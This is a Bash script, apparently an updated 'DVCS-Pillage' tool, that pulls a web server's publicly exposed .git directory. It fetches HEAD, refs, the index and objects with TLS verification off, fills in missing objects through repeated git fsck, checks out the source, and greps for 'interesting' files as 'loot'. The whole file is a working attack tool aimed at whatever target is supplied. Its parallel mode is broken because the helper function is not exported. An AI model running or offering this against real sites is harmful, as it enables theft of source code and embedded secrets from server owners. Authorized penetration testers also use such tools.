#!/usr/bin/env bash
set -euo pipefail

##
## Modernized DVCS-Pillage .. beta .. (testing) 
## - Updated for modern Bash & Git
## - Adds colors, parallel mode, smarter fetch, probably
##

# --- Config ---
CURL_BIN=$(command -v curl || true)
WGET_BIN=$(command -v wget || true)
CRAWLER=""
PARALLEL=false
LOGFILE="pillage.log"

# --- Colors ---
RED="\033[31m"; GREEN="\033[32m"; YELLOW="\033[33m"; BLUE="\033[34m"; NC="\033[0m"

# --- Usage ---
if [[ $# -lt 2 ]]; then
    cat <<EOF
Usage:
    $0 protocol host[/dir] [single_file] [--parallel]

Examples:
    $0 http example.com/images
    $0 https example.com
    $0 http target.com images/config.php --parallel
EOF
    exit 1
fi

PROTO=$1
TARGET=$2
SINGLE_FILE=${3:-""}
[[ "${4:-}" == "--parallel" ]] && PARALLEL=true

# --- Parse host/dir ---
if [[ $TARGET =~ "/" ]]; then
    HOST=${TARGET%%/*}
    DIR=${TARGET#*/}
else
    HOST=$TARGET
    DIR=""
fi
BASEURL="$PROTO://$HOST/${DIR:+$DIR/}.git/"

# --- Pick HTTP client ---
if [[ -n "$WGET_BIN" ]]; then
    CRAWLER="wget"
elif [[ -n "$CURL_BIN" ]]; then
    CRAWLER="curl"
else
    echo >&2 "No usable HTTP client found (need curl or wget)"
    exit 1
fi

# --- Helpers ---
log() { echo -e "[$(date +%H:%M:%S)] $*" | tee -a "$LOGFILE"; }
ok() { log "${GREEN}[OK]${NC} $*"; }
warn() { log "${YELLOW}[!]${NC} $*"; }
fail() { log "${RED}[FAIL]${NC} $*"; }

fetch() {
    local path="$1"
    local dest=".git/$path"
    mkdir -p "$(dirname "$dest")"
    if [[ ! -s "$dest" ]]; then
        if [[ "$CRAWLER" == "wget" ]]; then
            wget -q --no-check-certificate -O "$dest" "$BASEURL$path" || true
        else
            curl -s -f -S --insecure -o "$dest" "$BASEURL$path" || true
        fi
    fi
}

fetch_sha() {
    local sha="$1"
    local dir="${sha:0:2}"
    local file="${sha:2}"
    fetch "objects/$dir/$file"
}

# --- Init workspace ---
WORKDIR="pillage-$HOST"
mkdir -p "$WORKDIR"
cd "$WORKDIR"
git init -q

# --- Start pillage ---
ok "Target: $BASEURL"

# 1. Basic files
for f in HEAD config index .gitignore; do
    fetch "$f"
done

# 2. Refs
if [[ -s .git/HEAD ]]; then
    ref=$(awk '{print $2}' .git/HEAD || true)
    [[ -n "$ref" ]] && fetch "$ref"
    [[ -s ".git/$ref" ]] && fetch_sha "$(cat .git/$ref)"
fi

# 3. Single file shortcut
if [[ -n "$SINGLE_FILE" ]]; then
    sha=$(git ls-files --stage 2>/dev/null | grep "$SINGLE_FILE" | awk '{print $3}' | head -1 || true)
    if [[ -n "$sha" ]]; then
        fetch_sha "$sha"
        git checkout "$SINGLE_FILE" || true
        ok "Retrieved $SINGLE_FILE"
        exit 0
    else
        fail "File $SINGLE_FILE not found in index"
        exit 1
    fi
fi

# 4. Crawl all indexed files
count=$(git ls-files 2>/dev/null | wc -l || echo 0)
if [[ $count -gt 0 ]]; then
    warn "About to request $count objects..."
    read -p "Continue? (y/n) " REPLY
    [[ "$REPLY" != "y" ]] && exit 0

    if $PARALLEL; then
        git ls-files --stage | awk '{print $2}' | xargs -n1 -P8 -I{} bash -c 'fetch_sha "$@"' _ {}
    else
        while read -r sha; do
            fetch_sha "$sha"
        done < <(git ls-files --stage | awk '{print $2}')
    fi
fi

# 5. Use git fsck trick
warn "Running git fsck to find missing objects..."
while true; do
    missing=$(git fsck 2>&1 | awk '/^missing/ {print $3}' | sort -u || true)
    [[ -z "$missing" ]] && break
    for sha in $missing; do
        fetch_sha "$sha"
    done
done

# 6. Checkout files
ok "Checking out files..."
git ls-files | while read -r f; do
    git checkout --quiet "$f" || true
done

# 7. Reporting
echo -e "\n${BLUE}#### Potentially Interesting Files ####${NC}\n"
regex="../pillage.regex"
if [[ -s "$regex" ]]; then
    grep -i -f "$regex" <(git ls-files) | grep -E -v '\.(gif|png|jpg|css|js|html)$' | while read -r file; do
        echo -n "$file"
        [[ -e "$file" ]] && echo " - [CHECKED OUT]"
    done
else
    git ls-files
fi

ok "Done. Loot in: $WORKDIR"


